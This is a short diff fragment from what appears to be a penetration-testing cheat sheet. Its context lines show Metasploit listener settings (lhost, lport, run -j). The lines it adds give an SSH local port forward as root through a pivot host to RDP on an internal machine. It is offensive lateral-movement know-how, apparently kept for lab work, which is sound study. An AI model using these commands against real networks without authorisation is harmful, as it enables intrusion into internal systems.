@@ -43,3 +43,9 @@ set lhost 10.10.14.5
 set lport 5555
 run -j
 ```
+
+## Forward RDP From an Internal Machine Through a Pivot to You
+
+```bash
+ssh -i rootssh -L 13389:172.16.8.20:3389 root@10.129.229.147
+```
